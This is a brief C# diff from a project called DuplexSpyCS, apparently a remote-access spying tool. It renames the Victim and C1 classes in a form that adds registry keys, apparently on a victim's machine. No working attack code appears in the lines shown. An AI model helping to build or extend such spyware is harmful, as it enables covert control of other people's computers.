@@ -16,7 +16,7 @@ namespace DuplexSpyCS
         public frmManager f_mgr;
         public string currentPath;
 
-        public Victim v;
+        public clsVictim v;
 
         public frmRegAddKey()
         {
@@ -31,7 +31,7 @@ namespace DuplexSpyCS
         //Generate Name
         private void button1_Click(object sender, EventArgs e)
         {
-            textBox1.Text = C1.GenerateFileName();
+            textBox1.Text = clsTools.GenerateFileName();
         }
 
         //Add
